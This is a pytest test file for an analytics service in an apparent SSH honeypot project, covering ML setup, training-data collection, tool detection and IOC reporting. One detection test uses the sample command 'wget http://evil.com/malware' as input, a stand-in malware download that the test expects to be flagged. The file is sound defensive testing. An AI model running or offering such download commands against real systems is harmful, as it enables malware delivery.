from unittest.mock import MagicMock, patch

import pytest

from cyanide.services.analytics import AnalyticsService


@pytest.fixture
def mock_logger(tmp_path):
    logger = MagicMock()
    logger.ml_log_path = tmp_path / "ml.log"
    return logger


@pytest.fixture
def analytics_service(mock_logger):
    config = {
        "ml": {
            "enabled": True,
            "online_learning": True,
            "retraining_interval_days": 7,
            "model_path": "fake/path",
        }
    }
    with patch("cyanide.services.analytics.AnalyticsService._init_ml"):
        service = AnalyticsService(config, mock_logger)
        return service


def test_analytics_init_error(mock_logger):
    config = {"ml": {"enabled": True}}
    # Force an error in GeoIP/StatsManager import or init
    with patch("cyanide.core.geoip.GeoIP", side_effect=Exception("GeoIP error")):
        AnalyticsService(config, mock_logger)
        mock_logger.log_event.assert_any_call(
            "system", "service_init_error", {"service": "AnalyticsService", "error": "GeoIP error"}
        )


@pytest.mark.asyncio
async def test_run_online_learning_loop_disabled(analytics_service, mock_logger):
    analytics_service.ml_online_learning = False
    await analytics_service.run_online_learning_loop()
    mock_logger.log_event.assert_any_call(
        "system",
        "ml_online_learning_status",
        {"status": "disabled", "reason": "online_learning or ml disabled"},
    )


def test_fetch_training_data(analytics_service, mock_logger):
    from cyanide.core.stats import StatsManager

    stats = StatsManager()
    stats.on_command("ssh", "1.1.1.1", "root", "ls -la")
    stats.on_command("ssh", "1.1.1.1", "root", "whoami")

    analytics_service.stats = stats
    data = analytics_service._fetch_training_data()
    assert "ls -la" in data
    assert "whoami" in data


def test_fetch_training_data_no_stats(analytics_service):
    analytics_service.stats = None
    data = analytics_service._fetch_training_data()
    assert data == []


def test_analyze_command_tool_detection(analytics_service, mock_logger):
    mock_reporter = MagicMock()
    analytics_service.set_ioc_reporter(mock_reporter)

    analytics_service.analyze_command("wget http://evil.com/malware", "1.2.3.4", "sess1")

    mock_logger.log_event.assert_any_call(
        "sess1",
        "tool_detection",
        {"src_ip": "1.2.3.4", "tool": "wget", "command": "wget http://evil.com/malware"},
    )
    mock_reporter.add_ioc.assert_called()


def test_analyze_file_hash_reporting(analytics_service, mock_logger):
    mock_reporter = MagicMock()
    analytics_service.set_ioc_reporter(mock_reporter)

    # Mock ML pipeline to return an anomaly
    analytics_service.ml_pipeline = MagicMock()
    analytics_service.ml_pipeline.analyze_command.return_value = {
        "is_anomaly": True,
        "anomaly_score": 0.9,
        "reconstruction_error": 1.5,
        "classification": "malware",
        "severity": "high",
    }

    analytics_service.analyze_file("/path/to/file", b"content", "sess1", "1.1.1.1")
    mock_reporter.add_ioc.assert_called()
